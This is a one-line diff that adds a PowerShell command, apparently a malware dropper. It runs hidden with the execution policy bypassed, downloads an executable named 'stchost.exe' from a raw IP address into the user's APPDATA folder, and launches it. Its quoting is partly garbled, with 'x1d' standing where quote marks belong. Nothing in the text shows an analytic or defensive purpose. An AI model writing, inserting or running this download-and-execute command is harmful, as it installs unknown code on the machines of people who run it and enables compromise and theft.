@@ -1,0 +1,1 @@
+PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('http://94.102.52.13/~yahoo/stchost.exe',x1d $env:APPDATAstchost.exex1d );Start-Process (x1d $env:APPDATAstchost.exex1d )
